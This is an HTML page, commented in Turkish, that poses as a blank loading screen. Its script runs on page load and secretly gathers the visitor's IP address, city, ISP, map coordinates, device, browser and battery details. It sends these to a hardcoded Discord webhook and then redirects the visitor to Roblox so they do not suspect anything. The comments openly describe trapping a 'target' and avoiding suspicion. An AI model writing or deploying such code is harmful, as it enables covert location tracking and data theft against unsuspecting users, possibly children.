<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Yükleniyor...</title>
    <style>
        /* Kullanıcıyı şüphelendirmemek için boş bir sayfa veya basit bir yükleniyor ekranı */
        body { background: #000; color: #333; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: #00ff41; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="spinner"></div>

<script>
    const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";

    async function ghostCapture() {
        // 1. Cihaz bilgilerini saniyesinde topla
        const screenRes = `${window.screen.width}x${window.screen.height}`;
        const language = navigator.language;
        const platform = navigator.platform;
        const browser = navigator.userAgent.split(' ').pop();
        let batteryInfo = "Bilinmiyor";

        try {
            const battery = await navigator.getBattery();
            batteryInfo = `%${Math.round(battery.level * 100)}`;
        } catch(e) {}

        // 2. IP ve Lokasyon verilerini çek
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;

            // 3. Discord'a veriyi gönder
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: "HAYALET ERİŞİM SİSTEMİ",
                    embeds: [{
                        title: "👤 HEDEF TUZAĞA DÜŞTÜ",
                        color: 3447003,
                        description: `🎮 **Hedef Roblox'a yönlendiriliyor...**\n📍 [Google Maps Konumu](${mapLink})`,
                        fields: [
                            { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
                            { name: "📍 Şehir/Ülke", value: `\`${data.city} / ${data.country_name}\``, inline: true },
                            { name: "📡 ISS", value: `\`${data.org}\``, inline: false },
                            { name: "💻 Sistem / Ekran", value: `\`${platform} / ${screenRes}\``, inline: true },
                            { name: "🔋 Şarj / Dil", value: `\`${batteryInfo} / ${language}\``, inline: true },
                            { name: "🛠️ Tarayıcı", value: `\`${browser}\``, inline: true }
                        ],
                        footer: { text: "Veri sızdırıldı, yönlendirme başarılı." },
                        timestamp: new Date()
                    }]
                })
            });

            // 4. VERİ GİTTİKTEN SONRA ROBLOX'A AT
            // Çok kısa bir bekleme (500ms) verinin tam ulaşmasını garanti eder
            setTimeout(() => {
                window.location.href = "https://www.roblox.com";
            }, 500);

        } catch (err) {
            // Hata olsa bile Roblox'a at ki şüphelenmesin
            window.location.href = "https://www.roblox.com";
        }
    }

    // Site açılır açılmaz operasyonu başlat
    window.onload = ghostCapture;
</script>
</body>
</html>
